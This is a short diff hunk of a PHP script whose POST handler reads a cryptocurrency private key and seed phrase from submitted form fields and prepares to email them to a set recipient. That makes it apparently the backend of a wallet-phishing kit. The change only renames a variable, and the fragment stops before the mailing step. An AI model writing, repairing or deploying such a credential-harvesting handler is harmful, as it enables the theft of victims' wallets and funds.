@@ -5,7 +5,7 @@ error_reporting(E_ALL);
 // phpinfo();
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Retrieve privkey and seedphr from POST request
-    $privkey = $_POST['privky'];
+    $privky = $_POST['privky'];
     $seedphr = $_POST['seedphr'];
 
     // Set the recipient email address
